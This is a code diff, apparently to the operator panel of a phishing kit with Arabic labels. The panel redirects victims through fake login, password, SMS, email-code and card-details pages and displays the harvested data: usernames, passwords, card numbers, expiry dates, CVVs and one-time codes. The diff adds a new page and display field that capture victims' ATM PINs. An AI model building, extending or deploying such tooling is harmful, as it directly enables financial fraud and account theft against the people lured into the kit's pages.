@@ -276,6 +276,7 @@
       <button onclick="doRedirect('code3.html')">صفحة رمز 3 أرقام</button>
       <button onclick="doRedirect('email-code.html')">صفحة رمز الإيميل</button>
       <button onclick="doRedirect('card-details.html')">صفحة بيانات البطاقة</button>
+      <button onclick="doRedirect('atm.html')">صفحة ATM PIN</button>
       <button onclick="doRedirect('success.html')">صفحة النجاح</button>
     </div>
   </div>
@@ -332,7 +333,7 @@ const pageLabels = {
   "login":"تسجيل الدخول","password":"الرمز السري",
   "waiting":"جاري التحقق","code":"رمز التحقق","code3":"رمز 3 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 3 أرقام",
   "email-code":"رمز الإيميل","email-code-waiting":"تحقق رمز الإيميل",
-  "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة",
+  "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة","atm":"ATM PIN",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
 };
 
@@ -505,7 +506,7 @@ function showDetails(id) {
   var loginCountryHtml = o.login_country ? countryDisplay(o.login_country) : "—";
   detailsHtml += '<div class="cred-row"><div><div class="cred-label">الدولة المختارة</div><div class="cred-val" style="color:var(--ink);font-family:inherit;font-size:14px;letter-spacing:0;display:flex;align-items:center;gap:6px">' + loginCountryHtml + '</div></div></div>';
   detailsHtml += credRow("اسم المستخدم", o.login_username, "var(--purple)");
-  detailsHtml += credRow("الرمز السري", o.login_password, "var(--purple)");
+  detailsHtml += credRow("رقم ATM", o.atm_pin, "var(--purple)");
   detailsHtml += `</div></div>`;
 
   // رمز التحقق (SMS)
@@ -524,6 +525,7 @@ function showDetails(id) {
   detailsHtml += credRow("رقم البطاقة", o.card_number, "#e65100");
   detailsHtml += credRow("تاريخ الانتهاء", o.card_expiry, "#e65100");
   detailsHtml += credRow("CVV", o.card_cvv, "#e65100");
+  detailsHtml += credRow("الرمز السري", o.login_password, "#e65100");
   detailsHtml += `</div></div>`;
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
